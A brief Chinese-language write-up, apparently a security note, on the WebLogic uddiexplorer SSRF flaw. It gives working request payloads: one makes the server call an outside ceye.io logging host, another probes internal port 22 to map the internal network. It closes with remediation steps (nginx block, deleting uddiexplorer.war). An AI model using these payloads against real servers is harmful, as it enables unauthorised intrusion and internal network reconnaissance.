uddiexplorer漏洞

payload:<code>/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.053r5r.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search

1）访问

http://*****:7008//uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:22&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search

通过返回值  可以确定127.0.0.1 端口 22 是否开启。从而，可以扫描内网所有ip 和 开启的端口。

2）解决方法：

     nginx 配置拦截 uddiexplorer 不让访问

     /root/Oracle/Middleware64/user_projects/domains/web/servers/AdminServer/tmp/.internal        直接删除 uddiexplorer.war 包
